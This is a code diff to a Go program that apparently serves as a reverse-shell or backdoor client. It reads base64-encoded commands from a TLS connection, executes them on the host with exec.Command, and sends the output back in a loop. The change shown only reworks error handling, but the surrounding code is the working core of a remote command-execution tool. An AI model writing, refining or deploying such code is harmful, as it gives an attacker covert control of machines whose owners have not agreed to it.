@@ -55,15 +55,14 @@ func getOS(conn *tls.Conn) string {
 	return runtime.GOOS
 
 }
-func execInput(input string) string {
+func execInput(input string) (string, error){
 	// Remove the newline character.
 	input = strings.TrimSuffix(input, "\n")
 	fmt.Println(input)
 	// Prepare the command to execute.
 	cmd, err := exec.Command(input).Output()
-	handleError(err)
 
-	return string(cmd)
+	return string(cmd), err
 }
 
 func main() {
@@ -97,8 +96,10 @@ func main() {
 		_, err := conn.Read(buffer)
 		handleError(err)
 		sDec, _ := base64.StdEncoding.DecodeString(string(buffer[:]))
-		resp := execInput(string(sDec))
+		resp, err:= execInput(string(sDec))
+		
 		conn.Write([]byte(resp))
+
 		time.Sleep(time.Second)
 	}
 }
